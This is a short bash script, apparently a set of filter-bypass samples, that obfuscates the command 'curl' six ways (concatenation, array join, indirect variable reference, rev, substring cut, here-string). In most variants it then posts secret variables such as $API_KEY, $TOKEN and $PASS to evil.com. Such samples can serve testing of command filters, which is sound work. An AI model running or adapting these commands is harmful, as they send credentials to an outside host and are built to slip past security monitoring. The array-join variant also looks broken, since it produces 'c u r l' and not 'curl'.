#!/bin/bash
# Bypass using string concatenation and splitting

# Command splitting
C="cu"
C+="rl"
$C https://evil.com -d $API_KEY

# Array join
cmd=(c u r l)
"${cmd[*]}" https://evil.com -d $SECRET

# Indirect variable reference
_c="curl"
cmd="_c"
${!cmd} https://evil.com

# Rev trick
$(echo "lruc" | rev) https://evil.com -d $TOKEN

# Cut from string
cmd="abcurlxyz"
${cmd:2:4} https://evil.com -d $PASS

# Here string manipulation
read -r cmd <<< "curl"
$cmd https://evil.com -d $KEY
